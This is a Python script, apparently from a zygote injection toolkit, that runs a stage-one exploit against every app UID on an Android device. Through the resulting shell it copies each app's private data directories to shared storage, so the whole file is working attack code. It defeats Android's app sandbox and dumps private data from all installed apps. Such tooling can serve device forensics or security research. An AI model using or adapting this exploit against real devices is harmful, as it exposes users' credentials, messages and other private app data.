import socket
import re
import time
from collections import defaultdict
from io import BytesIO

from zygote_injection_toolkit.device import Device
from zygote_injection_toolkit.stage1 import Stage1Exploit


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


class AppDataDumper:
    def __init__(self, initialPort: int = 1234) -> None:
        self.initialPort = initialPort
        self.port = initialPort - 1
        self.device = Device()   
    
    def list_uids(self) -> dict[int, list[str]]:
        pkg_list_output = self.device.shell_execute("pm list packages -U")["stdout"]

        # Group by UID
        grouped = defaultdict(list)
        for pkg, uid in re.findall(r"package:(\S+)\s+uid:(\d+)", pkg_list_output):
            grouped[int(uid)].append(pkg)
        return { int(uid): pkgs for uid, pkgs in grouped.items() }

    def exfilterate_data(self, packages: list[str]) -> bool:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
                try:
                    device_socket.connect(("127.0.0.1", self.port))
                    # in case there is already a partially typed command
                    device_socket.sendall(b"\n")
                    for package in packages:
                        device_socket.sendall("mkdir -p /sdcard/data_dump/data/\n".format(pkg=package).encode())
                        device_socket.sendall("mkdir -p /sdcard/data_dump/data_de/\n".format(pkg=package).encode())
                        device_socket.sendall("cp -r /data/user/0/{pkg} /sdcard/data_dump/data/\n".format(pkg=package).encode())
                        device_socket.sendall("cp -r /data/user_de/0/{pkg} /sdcard/data_dump/data/\n".format(pkg=package).encode())
                    device_socket.sendall(b"echo completed\n")
                    
                    while True:
                        data = device_socket.recv(10000)
                        if "completed" in data.decode():
                            device_socket.sendall(b"kill $$\n") # kill self
                            return True
                except ConnectionRefusedError:
                    print("\tConnection refused, retrying...")
                    time.sleep(1)
                    continue
                except Exception as e:
                    print(e)
                    break
                    
        return False
        
    def run(self) -> None:
        uid_pkg_map = self.list_uids()
        failed_uid_pkg_map = {}
        
        for uid, pkgs in uid_pkg_map.items():
            self.port += 1
            
            print(f"Dumping UID {uid} on port {self.port} with package(s): '{"System" if (uid == 1000) else ', '.join(pkgs)}'")
        
            exploit = Stage1Exploit(port=self.port, target_uid=uid, target_package=pkgs[0], silent=True)
            
            if not exploit.exploit_stage1():
                failed_uid_pkg_map[uid] = pkgs
                print("\tExploit failed")
                continue
            
            if not self.exfilterate_data(pkgs):
                print("\tData exfilteration failed")
                continue
                
        if len(failed_uid_pkg_map) > 0:
            print()
            print("The following UIDs failed to be dumped:")
            for uid, pkgs in failed_uid_pkg_map.items():
                print(f"\tUID {uid} ({"System" if (uid == 1000) else ', '.join(pkgs)})")



